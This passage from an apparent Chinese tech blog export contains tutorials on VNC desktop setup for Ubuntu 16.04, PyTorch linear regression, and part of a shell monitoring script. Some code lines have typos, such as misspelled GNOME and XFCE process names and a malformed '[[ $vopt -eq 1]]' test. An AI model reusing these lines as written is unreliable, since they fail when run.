<li>VNC由两部分组成，客户端的应用软件(vncviewer)&emsp;+&emsp;服务器端的应用程序(vncserver)</li>
</ul>
<h2 id="2-ubuntu16-04中安装服务端程序"><a href="#2-ubuntu16-04中安装服务端程序" class="headerlink" title="2. ubuntu16.04中安装服务端程序"></a>2. ubuntu16.04中安装服务端程序</h2><p>使用SSH登录到系统<br></p>
<ul>
<li><p>step1 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
</li>
<li><p>step 2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install vnc4server</span><br></pre></td></tr></table></figure>
</li>
<li><p>step 3<br>启动vncserver</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vncserver</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>步骤三中会出现如下界面<br><img src="/images/ubuntu1604vnc/01.png" alt="pic01"><br>输入密码即可，这是客户端登陆密码。<br><br>出现如下界面说明服务端安装成功<br><img src="/images/ubuntu1604vnc/02.png" alt="pic02"></p>
<blockquote>
<p>此时使用vncviewer登录出现的界面如下所示，对此需要安装一个图形化桌面<br><img src="/images/ubuntu1604vnc/03.png" alt="pic03"></p>
</blockquote>
<h2 id="3-ubuntu16-04安装图形化桌面"><a href="#3-ubuntu16-04安装图形化桌面" class="headerlink" title="3. ubuntu16.04安装图形化桌面"></a>3. ubuntu16.04安装图形化桌面</h2><h3 id="3-1-全ubuntu16-04桌面-不推荐-gnome环境"><a href="#3-1-全ubuntu16-04桌面-不推荐-gnome环境" class="headerlink" title="3.1 全ubuntu16.04桌面(不推荐)gnome环境"></a>3.1 全ubuntu16.04桌面(不推荐)gnome环境</h3><blockquote>
<p>缺点：占用资源多</p>
<ul>
<li>step1&emsp;安装x-windows</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install x-window-system-core</span><br></pre></td></tr></table></figure>

<ul>
<li><p>step2&emsp;安装登录管理器(可不选)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gdm</span><br></pre></td></tr></table></figure>
</li>
<li><p>step3&emsp;安装ubuntu桌面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ubuntu-desktop</span><br></pre></td></tr></table></figure>
</li>
<li><p>step4&emsp;安装gnome配套软件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gnome-panel gnome-settings-daemon metacity nautilus gnome-terminal</span><br></pre></td></tr></table></figure>
</li>
<li><p>step5&emsp;修改VNC配置文件，使桌面生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim ~/.vnc/xstartup</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>变成如下文件配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># Uncomment the following two lines for normal desktop:</span><br><span class="line">export XKL_XMODMAP_DISABLE=1</span><br><span class="line"> unset SESSION_MANAGER</span><br><span class="line"># exec /etc/X11/xinit/xinitrc</span><br><span class="line">unset DBUS_SESSION_BUS_ADDRESS</span><br><span class="line">gnome-panel &amp;</span><br><span class="line">gnmoe-settings-daemon &amp;</span><br><span class="line">metacity &amp;</span><br><span class="line">nautilus &amp;</span><br><span class="line">gnome-terminal &amp;</span><br></pre></td></tr></table></figure>

<p>重新启动就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vncserver -kill :1  #杀掉原桌面进程（:1)就是</span><br><span class="line">vncserver :1 #重新启动</span><br></pre></td></tr></table></figure>

<h3 id="3-2-ubuntu16-04剪切版-推荐-emsp-gnome环境"><a href="#3-2-ubuntu16-04剪切版-推荐-emsp-gnome环境" class="headerlink" title="3.2 ubuntu16.04剪切版(推荐)&emsp;gnome环境"></a>3.2 ubuntu16.04剪切版(推荐)&emsp;gnome环境</h3><blockquote>
<p>优点：占用系统资源少，仅安装核心组件：不安装例如 office、浏览器、等等的额外组件</p>
<ul>
<li>step1&emsp;安装x-windows</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install x-window-system-core</span><br></pre></td></tr></table></figure>

<ul>
<li><p>step2&emsp;安装登录管理器(可不选)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gdm</span><br></pre></td></tr></table></figure>
</li>
<li><p>step3&emsp;安装ubuntu桌面(剪切版)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install --no-install-recommends ubuntu-desktop</span><br></pre></td></tr></table></figure>
</li>
<li><p>step4&emsp;安装gnome配套软件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gnome-panel gnome-settings-daemon metacity nautilus gnome-terminal</span><br></pre></td></tr></table></figure>
</li>
<li><p>step5&emsp;修改VNC配置文件，使桌面生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim ~/.vnc/xstartup</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><strong>在文件最后添加如下记录</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gnome-panel &amp;</span><br><span class="line">gnome-settings-daemon &amp;</span><br><span class="line">metacity &amp;</span><br><span class="line">nautilus &amp;</span><br></pre></td></tr></table></figure>

<h3 id="3-3-安装xfce4桌面"><a href="#3-3-安装xfce4桌面" class="headerlink" title="3.3 安装xfce4桌面"></a>3.3 安装xfce4桌面</h3><blockquote>
<p>优点：Xfce占用的内存和CPU使用量非常小；Xfce桌面很简单，而且没有乱七八糟的东西<a href="#re3">参考文献</a></p>
<ul>
<li>step 1:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install xfce4</span><br></pre></td></tr></table></figure>

<ul>
<li>step 2:修改配置文件<br>该文件路径一般在下面<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi ~/.vnc/xstartup</span><br></pre></td></tr></table></figure>

</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#x-window-manager &amp;</span><br><span class="line">sesion-manager &amp; xfdesktop &amp; xfce4-panel &amp;</span><br><span class="line">xfce4-menu-plugin &amp;</span><br><span class="line">xfsettingsd &amp;</span><br><span class="line">xfconfd &amp;</span><br><span class="line">xfwm4 &amp;</span><br></pre></td></tr></table></figure>

<h2 id="4-卸载桌面程序"><a href="#4-卸载桌面程序" class="headerlink" title="4. 卸载桌面程序"></a>4. 卸载桌面程序</h2><h3 id="4-1-卸载gnome桌面"><a href="#4-1-卸载gnome桌面" class="headerlink" title="4.1 卸载gnome桌面"></a>4.1 卸载gnome桌面</h3><ul>
<li><p>step1: 卸载掉gnome-shell主程序及其配套软件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove gnome-shell</span><br><span class="line">sudo apt-get remove ubuntu-desktop</span><br><span class="line">sudo apt-get remove gnome-panel gnome-settings-daemon metacity nautilus gnome-terminal</span><br></pre></td></tr></table></figure>
</li>
<li><p>step2: 清理安装gnome时候留下的缓存程序软件包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get autoclean</span><br><span class="line">sudo apt-get clean</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="4-2-卸载xfce4桌面"><a href="#4-2-卸载xfce4桌面" class="headerlink" title="4.2 卸载xfce4桌面"></a>4.2 卸载xfce4桌面</h3><ul>
<li><p>step1: 卸载xfce4</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove xfce4</span><br></pre></td></tr></table></figure>
</li>
<li><p>step2: 卸载相关软件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove xfce4*</span><br></pre></td></tr></table></figure>
</li>
<li><p>step3: 自动卸载不必要的软件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get  autoremove</span><br></pre></td></tr></table></figure>
</li>
<li><p>step4: 系统清理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get  clean</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="5-vnc相关的重要命令"><a href="#5-vnc相关的重要命令" class="headerlink" title="5. vnc相关的重要命令"></a>5. vnc相关的重要命令</h2><ol>
<li><p>启动vncserver</p>
<blockquote>
<p>:1是桌面号</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vncserver :1</span><br></pre></td></tr></table></figure>
</li>
<li><p>关闭vncserver</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vncserver -kill :1</span><br></pre></td></tr></table></figure>
</li>
<li><p>客户端连接vncserver</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip:1</span><br><span class="line">ip:5901</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://blog.csdn.net/u014389734/article/details/79513517" target="_blank" rel="noopener">https://blog.csdn.net/u014389734/article/details/79513517</a><br>[2] <a href="http://dblab.xmu.edu.cn/blog/1998-2/" target="_blank" rel="noopener">http://dblab.xmu.edu.cn/blog/1998-2/</a><br>[3] <a href="https://www.cnblogs.com/chenmingjun/p/8506995.html" target="_blank" rel="noopener">https://www.cnblogs.com/chenmingjun/p/8506995.html</a> <span id="re3">Linux的桌面环境gnome、kde、xfce、lxde 等等使用比较</span></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>LinuxVNC</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>pytorch01</title>
    <url>/2019/09/24/pytorch01/</url>
    <content><![CDATA[<h1 id="PyTorch入门之线性回归"><a href="#PyTorch入门之线性回归" class="headerlink" title="PyTorch入门之线性回归"></a>PyTorch入门之线性回归</h1><p><a href="http://pytorch.org/docs/0.3.0/tensors.html" target="_blank" rel="noopener">torch参考链接</a></p>
<a id="more"></a>
<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><blockquote>
<ul>
<li>python 3.7</li>
<li>Torch 1.2.0 用于计算</li>
<li>matplotlib 用于画图</li>
</ul>
</blockquote>
<p><strong>踩坑点</strong> <br><br>Torch安装需要用到pip命令，直接在pycharm中会失败 <br><br><strong>去官网获得pip的安装的命令</strong> <a href="https://pytorch.org/get-started/locally/" target="_blank" rel="noopener">Torch官网</a></p>
<h2 id="2-PyTorch基础知识"><a href="#2-PyTorch基础知识" class="headerlink" title="2. PyTorch基础知识"></a>2. PyTorch基础知识</h2><ul>
<li>Tensor是PyTorch的基础数据结构</li>
<li>另一个重要的变量是Variable变量，该变量进行自动微分运算<blockquote>
<p>反向传播算法随时进行<br><br>该变量三个重要的值： 数据（data），父节点（creator），以及梯度（grad）</p>
</blockquote>
</li>
<li>使用之前需要导入两个包</li>
</ul>
<p>创建变量方法如下<br></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import torch</span><br><span class="line">#导入自动梯度的运算包，主要用Variable这个类</span><br><span class="line">from torch.autograd import Variable</span><br><span class="line"></span><br><span class="line">#创建一个Variable，包裹了一个2*2张量，将需要计算梯度属性置为True</span><br><span class="line">x = Variable(torch.ones(2, 2), requires_grad=True)</span><br></pre></td></tr></table></figure>

<p>x变量如下所示 &emsp;&emsp;<strong>注意</strong> <code>.data</code> 可以返回一个 Variable 所包裹的 Tensor<br><br><img src="/images/pytorch01/t1.png" alt="x变量"></p>
<ul>
<li><code>torch.rand(5, 3)</code>产生[0,1]的均匀分布的随机数值，参数指定形状(一维时第二个参数可不要)</li>
<li><code>torch.randn(100)</code>产生均值为0，方差为1，正态分布随机数值(同样可以指定形状)</li>
<li><code>torch.linspace(start, end, steps=100, out=None) → Tensor</code>线性间隔的数值，返回一个一维张量</li>
<li><code>y.t()</code>完成张量的转置</li>
<li>Tensor可以与numpy.ndarray进行转换<blockquote>
<p>ndarray转换为Tensor<br></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.ones([5, 3]) #建立一个5*3全是1的二维数组（矩阵）</span><br><span class="line">b = torch.from_numpy(a) #利用from_numpy将其转换为tensor</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p>Tensor转换为ndarry<br></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c = b.numpy() #b为Tensor</span><br></pre></td></tr></table></figure>

<p> <strong>区别</strong> ：Tesnsor可以在GPU上运算</p>
<ul>
<li>使用backward进行反向传播，计算一些导数信息，可通过<code>.grad</code>获得梯度</li>
</ul>
<h2 id="3-单变量线性回归"><a href="#3-单变量线性回归" class="headerlink" title="3. 单变量线性回归"></a>3. 单变量线性回归</h2><blockquote>
<p>y = ax + b</p>
</blockquote>
<h3 id="3-1-产生数据"><a href="#3-1-产生数据" class="headerlink" title="3.1 产生数据"></a>3.1 产生数据</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># linspace可以生成0-100之间的均匀的100个数字</span><br><span class="line">x = Variable(torch.linspace(0, 100).type(torch.FloatTensor))</span><br><span class="line"></span><br><span class="line"># 随机生成100个满足标准正态分布的随机数，均值为0，方差为1.</span><br><span class="line"># 将这个数字乘以10，标准方差变为10</span><br><span class="line">rand = Variable(torch.randn(100)) * 10</span><br><span class="line"></span><br><span class="line"># 将x和rand相加，得到伪造的标签数据y。</span><br><span class="line"># 所以(x,y)应能近似地落在y=x这条直线上</span><br><span class="line">y = x + rand</span><br></pre></td></tr></table></figure>

<p>使用画图工具画图</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(10,8)) #设定绘制窗口大小为10*8 inch</span><br><span class="line"># 绘制数据，考虑到x和y都是Variable，</span><br><span class="line"># 需要用data获取它们包裹的Tensor，并专成numpy</span><br><span class="line">plt.plot(x.data.numpy(), y.data.numpy(), &apos;o&apos;)</span><br><span class="line">plt.xlabel(&apos;X&apos;) #添加X轴的标注</span><br><span class="line">plt.ylabel(&apos;Y&apos;) #添加Y轴的标注</span><br><span class="line">plt.show() #将图形画在下面</span><br></pre></td></tr></table></figure>

<p>结果如下所示<br><br><img src="/images/pytorch01/t2.png" alt="pic"></p>
<h3 id="3-2-递归下降"><a href="#3-2-递归下降" class="headerlink" title="3.2 递归下降"></a>3.2 递归下降</h3><p>step 1: 初始化参数（随机初始）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#创建a变量，并随机赋值初始化</span><br><span class="line">a = Variable(torch.rand(1), requires_grad = True)</span><br><span class="line">#创建b变量，并随机赋值初始化</span><br><span class="line">b = Variable(torch.rand(1), requires_grad = True)</span><br></pre></td></tr></table></figure>

<p>step 2: 训练1000次</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">learning_rate = 0.0001 #设置学习率</span><br><span class="line">for i in range(1000):</span><br><span class="line">    ### 下面这三行代码非常重要，这部分代码，清空存储在变量a，b中的梯度信息，</span><br><span class="line">    ### 以免在backward的过程中会反复不停地累加</span><br><span class="line">    #如果a和b的梯度都不是空</span><br><span class="line">    if (a.grad is not None) and (b.grad is not None):</span><br><span class="line">        a.grad.data.zero_() #清空a的数值</span><br><span class="line">        b.grad.data.zero_() #清空b的数值</span><br><span class="line">    #计算在当前a、b条件下的模型预测数值</span><br><span class="line">    predictions = a.expand_as(x) * x + b.expand_as(x)</span><br><span class="line">    #通过与标签数据y比较，计算误差</span><br><span class="line">    loss = torch.mean((predictions - y) ** 2)</span><br><span class="line">    print(&apos;loss:&apos;, loss.data.numpy())</span><br><span class="line">    loss.backward() #对损失函数进行梯度反传</span><br><span class="line">    #利用上一步计算中得到的a的梯度信息更新a中的data数值</span><br><span class="line">    a.data.add_(- learning_rate * a.grad.data)</span><br><span class="line">    #利用上一步计算中得到的b的梯度信息更新b中的data数值</span><br><span class="line">    b.data.add_(- learning_rate * b.grad.data)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>a.expand_as(x) : 将a升级为同x一样维度的张量</p>
</blockquote>
<p>step 3: 将训练后的结果展示出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x_data = x.data.numpy() # 获得x包裹的数据</span><br><span class="line">plt.figure(figsize = (10, 7)) #设定绘图窗口大小</span><br><span class="line">xplot, = plt.plot(x_data, y.data.numpy(), &apos;o&apos;) # 绘制原始数据</span><br><span class="line">yplot, = plt.plot(x_data, a.data.numpy() * x_data + b.data.numpy())  #绘制拟合数据</span><br><span class="line">plt.xlabel(&apos;X&apos;) #更改坐标轴标注</span><br><span class="line">plt.ylabel(&apos;Y&apos;) #更改坐标轴标注</span><br><span class="line">str1 = str(a.data.numpy()[0]) + &apos;x +&apos; + str(b.data.numpy()[0]) #图例信息</span><br><span class="line">plt.legend([xplot, yplot],[&apos;Data&apos;, str1]) #绘制图例</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>以下是拟合结果<br><br><img src="/images/pytorch01/t3.png" alt="pic"></p>
<h2 id="3-3-测试"><a href="#3-3-测试" class="headerlink" title="3.3 测试"></a>3.3 测试</h2><pre><code>x_test = Variable(torch.FloatTensor([1, 2, 10, 100, 1000])) #随便选择一些点1，2，……，1000
predictions = a.expand_as(x_test) * x_test + b.expand_as(x_test) #计算模型的预测结果
print(predictions) #输出</code></pre><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p><a href="https://github.com/oneCoderMan/myCodes/blob/master/PyTorch/linearRegression.py" target="_blank" rel="noopener">完整代码</a></p>
<p>source: <a href="https://www.shiyanlou.com/courses/1073/learning/?id=5821" target="_blank" rel="noopener">https://www.shiyanlou.com/courses/1073/learning/?id=5821</a></p>
]]></content>
      <categories>
        <category>deepLearing</category>
      </categories>
      <tags>
        <tag>PyTorch</tag>
        <tag>线性回归</tag>
      </tags>
  </entry>
  <entry>
    <title>shell-auto</title>
    <url>/2019/09/11/shell-auto/</url>
    <content><![CDATA[<h1 id="shell脚本实现Linux系统监控"><a href="#shell脚本实现Linux系统监控" class="headerlink" title="shell脚本实现Linux系统监控"></a>shell脚本实现Linux系统监控</h1><hr>
<p>代码见 <a href="https://github.com/oneCoderMan/myCodes/blob/master/shell/auto.sh" target="_blank" rel="noopener">https://github.com/oneCoderMan/myCodes/blob/master/shell/auto.sh</a></p>
<hr>
<a id="more"></a>

<h2 id="一-预备知识"><a href="#一-预备知识" class="headerlink" title="一. 预备知识"></a>一. 预备知识</h2><h3 id="1-1-getopts"><a href="#1-1-getopts" class="headerlink" title="1.1 getopts"></a>1.1 getopts</h3><blockquote>
<p>作用: 处理参数复杂的命令行选项和参数<br><br>格式：getopts option_string args<br><br>说明： option_string中是参数列表， args从命令行中接受的值</p>
</blockquote>
<p>示例代码：option.sh<br></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line">while getopts f:e:p: option</span><br><span class="line">do</span><br><span class="line">   case &quot;$&#123;option&#125;&quot; in</span><br><span class="line">       f) file_name=$&#123;OPTARG&#125;;;</span><br><span class="line">       e) editor=$&#123;OPTARG&#125;;;</span><br><span class="line">       p) page=$&#123;OPTARG&#125;;;</span><br><span class="line">       *) echo &quot;invalid&quot;;;</span><br><span class="line">   esac</span><br><span class="line">done</span><br><span class="line">echo &quot;$&#123;file_name&#125;&quot;</span><br><span class="line">echo &quot;$&#123;editor&#125;&quot;</span><br><span class="line">echo $&#123;page&#125;</span><br></pre></td></tr></table></figure>

<p>运行命令：<code>./option.sh -f bool.pdf -e YiJun -p HUANAN</code> <br><br>option_string是匹配的参数,字符后面有：表示该命令中必须加上参数，如-e yijun。否则会出现错误。参数的值会保存在<strong>OPTARG</strong>变量中。<br></p>
<blockquote>
<p>检测到非法参数就会停止</p>
</blockquote>
<h3 id="1-2-sign各含义"><a href="#1-2-sign各含义" class="headerlink" title="1.2 $+sign各含义"></a>1.2 $+sign各含义</h3><blockquote>
<ol>
<li><strong>$#</strong>   :Stores the number of command-line arguments that<br>   were passed to the shell program.<br></li>
<li><strong>$?</strong>    :Stores the exit value of the last command that was<br>   executed.<br></li>
<li><strong>$0</strong>   :Stores the first word of the entered command (the<br>   name of the shell program).<br></li>
<li><strong>$*</strong>   :Stores all the arguments that were entered on the<br>   command line ($1 $2 …).<br></li>
<li><strong>$@</strong>  :Stores all the arguments that were entered<br>   on the command line, individually quoted (“$1” “$2” …). <br></li>
<li><strong>$&gt;</strong> : 1&gt;是标准输出重定向， 可以省去1(变为 &gt; )； 2&gt;错误重定向。$&gt;是两种的结合，标准与错误重定向<br></li>
<li><strong>&gt;$1</strong> : 将重定向到1管道， 即定向到标准输出</li>
</ol>
</blockquote>
<p>如下例子：<br><br><code>./command -yes -no /home/username</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$# = 3</span><br><span class="line">$* = -yes -no /home/username</span><br><span class="line">$@ = array: &#123;&quot;-yes&quot;, &quot;-no&quot;, &quot;/home/username&quot;&#125;</span><br><span class="line">$0 = ./command, $1 = -yes etc.</span><br></pre></td></tr></table></figure>

<h3 id="1-3-tput与颜色转义"><a href="#1-3-tput与颜色转义" class="headerlink" title="1.3 tput与颜色转义"></a>1.3 tput与颜色转义</h3><p><a href="https://www.cnblogs.com/technologylife/p/8275044.html" target="_blank" rel="noopener">参考链接</a></p>
<blockquote>
<p><strong>tput作用</strong>：更改终端功能<br></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tput sgr0       # 恢复默认终端</span><br><span class="line">tput blink      # 文本闪烁</span><br></pre></td></tr></table></figure>

<p>一个例子1-3：<br></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tecreset=$(tput sgr0)</span><br><span class="line">echo -e &apos;\E[32m&apos;&quot;Operating System Type :&quot; $tecreset $os</span><br></pre></td></tr></table></figure>

<p>结果：<br><br><img src="/assets/shell/p1.png" alt="结果"></p>
<blockquote>
<p><strong>说明:</strong> <br></p>
<ol>
<li>如果把1-3中的$tecreset去掉，都会是绿色。<br></li>
<li>方便操作，不用每次都使用命令替换$(), ``， 因此用一个变量tecreset存储命令。</li>
</ol>
</blockquote>
<p><strong>linux终端的颜色由转义序列控制<br></strong></p>
<blockquote>
<p>转义序列由控制符 <code>esc</code>开头，控制序列引导符为：<code>\033</code>或者<code>\e[</code>，m为转义结束。<br></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">格式1：\033[ Param &#123;;Param;...&#125; m</span><br><span class="line"></span><br><span class="line">格式2：\e[ Param &#123;;Param;...&#125;m</span><br></pre></td></tr></table></figure>

<p>例子1-3   <a href="http://c.biancheng.net/linux/echo.html" target="_blank" rel="noopener">参考资料</a>  <br></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo -e &quot;\033[颜色1;颜色2m 要展示的文字 \033[0m&quot;</span><br><span class="line">\033[0m：表示将颜色恢复回原来的颜色</span><br></pre></td></tr></table></figure>

<h3 id="1-4-各种括号"><a href="#1-4-各种括号" class="headerlink" title="1.4 各种括号"></a>1.4 各种括号</h3><p><a href="https://blog.csdn.net/x1269778817/article/details/46535729" target="_blank" rel="noopener">参考文献</a></p>
<ul>
<li>$()与``<blockquote>
<p>用来做命令替换的，简化shell脚本的编写</p>
</blockquote>
</li>
<li>${}<blockquote>
<p>变量替换的，即变量引用</p>
</blockquote>
</li>
<li>$[]与 $(())<blockquote>
<p>都是用来做数学运算的<br><br><strong>注意</strong> : $(())中的变量前面可以加$,也可不用</p>
</blockquote>
</li>
<li>[]<blockquote>
<p>test命令的一种形式 左右需留空格，即判断true或者false</p>
</blockquote>
</li>
<li>(())与[[]]<blockquote>
<p>分别是数学表达式和字符表达式[]的加强版</p>
</blockquote>
<h2 id="二-监控系统脚本各模块"><a href="#二-监控系统脚本各模块" class="headerlink" title="二.监控系统脚本各模块"></a>二.监控系统脚本各模块</h2><h3 id="2-1-脚本安装-i"><a href="#2-1-脚本安装-i" class="headerlink" title="2.1 脚本安装 -i"></a>2.1 脚本安装 -i</h3>代码如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if [[ $iopt -eq 1 ]]; then   #对变量的引用要加上$  then如果是同一行的话要加上;</span><br><span class="line">  &#123;</span><br><span class="line">    #获得它的路径</span><br><span class="line">    wd=`pwd`</span><br><span class="line">    #获得它的文件名</span><br><span class="line">    basename `echo $0` &gt; /tmp/script</span><br><span class="line">    #拼接</span><br><span class="line">    scriptname=`echo -e -n $wd/ &amp;&amp; cat /tmp/script`</span><br><span class="line">    # 加载到环境变量中去</span><br><span class="line">    su -c &quot;cp $scriptname /usr/bin/monitor&quot; root &amp;&amp; echo &quot;congratulations! install successful!&quot; || echo &quot;install failed!&quot;</span><br><span class="line">  &#125;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p><strong>代码说明</strong><br></p>
<ol>
<li>``(反引号)是执行shell命令，可将结果保存在变量中。同$(),这个有些shell不支持。<br></li>
<li>basename 命令是将前缀和最后的/删除，保留最后一个字符串显示出来<br></li>
<li>$0 是指shell本生的文件名，<code>sh test.sh</code>得到 test.sh。<code>./test.sh</code> 得到的是./test.sh <br></li>
<li>echo中的-e 用来打印转义符， -n不换行打印<br></li>
<li>su -c command USER 切换用户USER执行命令command，执行完之后返回原用户<br></li>
<li>||  &amp;&amp; 在命令组合中具有短路左右，可以看成if else结构<br></li>
<li>[[ ]] (())这个是进行数学表达式和字符表达式运算的加强版。推荐使用 ,<strong>左右需留空格</strong><br></li>
<li>-eq 是数字等于判断， 对于字符串等于使用=</li>
</ol>
</blockquote>
<h3 id="2-2-关于模块-v"><a href="#2-2-关于模块-v" class="headerlink" title="2.2 关于模块 -v"></a>2.2 关于模块 -v</h3><p>代码如下:<br></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if [[ $vopt -eq 1]]</span><br><span class="line">then</span><br><span class="line">  &#123;</span><br><span class="line">    echo -e &quot;monitor version 1\nreleased Under ....&quot;</span><br><span class="line">  &#125;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h3 id="2-3-帮助模块-h"><a href="#2-3-帮助模块-h" class="headerlink" title="2.3 帮助模块 -h"></a>2.3 帮助模块 -h</h3><p>代码如下： <br></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if [[ $hopt -eq 1 ]]</span><br><span class="line">then</span><br><span class="line">  &#123;</span><br><span class="line">    echo -e &quot;  -i\tinstall the scripts &quot;</span><br><span class="line">    echo -e &quot;  -v\tprint version &quot;</span><br><span class="line">    echo -e &quot; -h\t print help info&quot;</span><br><span class="line">  &#125;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h3 id="2-4-查看操作系统类型"><a href="#2-4-查看操作系统类型" class="headerlink" title="2.4 查看操作系统类型"></a>2.4 查看操作系统类型</h3><blockquote>
<p><strong>注意</strong> ：不同操作系统对应的代码不一样啊， 本文中只讨论centOS系统.不同版本的代码见附录1</p>
</blockquote>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看系统版本和名称</span><br><span class="line">OS=`uname -s`</span><br><span class="line">REV=`uname -r`</span><br><span class="line">MACH=`uname -m`</span><br><span class="line"></span><br><span class="line">#查看操作系统类型，这里适用于redHat</span><br><span class="line">if [[ $&#123;OS&#125; = &quot;Linux&quot; ]]; then</span><br><span class="line">&#123;</span><br><span class="line">  KERNEL=`uname -r`  #内核发布版本</span><br><span class="line">  if [ -f /etc/redhat-release ]; then  # test -f filename, 测试是否为普通文件</span><br><span class="line">  &#123;</span><br><span class="line">    DIST=&quot;RedHat&quot;</span><br><span class="line">    Psuedoname=`cat /etc/redhat-release | sed s/.*\(// | sed s/\)//`</span><br><span class="line">    REV=`cat /etc/redhat-release | sed s/.*release\ // | sed s/\ .*//`</span><br><span class="line">  &#125;</span><br><span class="line">  fi</span><br><span class="line">  OSSTR=&quot;$&#123;OS&#125; $&#123;DIST&#125; $&#123;REV&#125;($&#123;Psuedoname&#125; $&#123;KERNEL&#125; $&#123;MACH&#125;)&quot;</span><br><span class="line">&#125;</span><br><span class="line">fi</span><br><span class="line">echo $&#123;OSSTR&#125;</span><br></pre></td></tr></table></figure>

<p>代码说明：</p>
<blockquote>
<ol>
<li>uname是查看系统版本的命令 <br></li>
<li><code>[ -f /etc/redhat-release ]</code> 文件测试指令<br></li>
<li>可以查看 <a href="http://coolshell.cn/articles/9104.html" target="_blank" rel="noopener">http://coolshell.cn/articles/9104.html</a> 获取sed帮助</li>
</ol>
</blockquote>
<h3 id="2-5-监控系统的各种信息"><a href="#2-5-监控系统的各种信息" class="headerlink" title="2.5 监控系统的各种信息"></a>2.5 监控系统的各种信息</h3><ul>
<li>查看DNS<br><br><code>cat /etc/resolv.conf | sed &#39;1d&#39; | awk &#39;{print $2}&#39;</code><blockquote>
<p><strong>解释说明</strong> <br><br>读取配置文件，删除第一行， 打印第二个字段</p>
</blockquote>
</li>
<li>查看系统负载<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">loadverage=$(top -n 1 -b | grep &quot;load average:&quot; | awk &apos;&#123;print $10 $11 $12&#125;&apos;)</span><br><span class="line">echo -e &quot;\E[32m load average: \E[0m &quot;$&#123;loadverage&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p><strong>说明</strong> <br><br>top -n 1 只迭代一次，不会动态刷新， top -n 1 -b 示非动态打印系统资源使用情况</p>
<ul>
<li>查看系统运行时间</li>
</ul>
</blockquote>
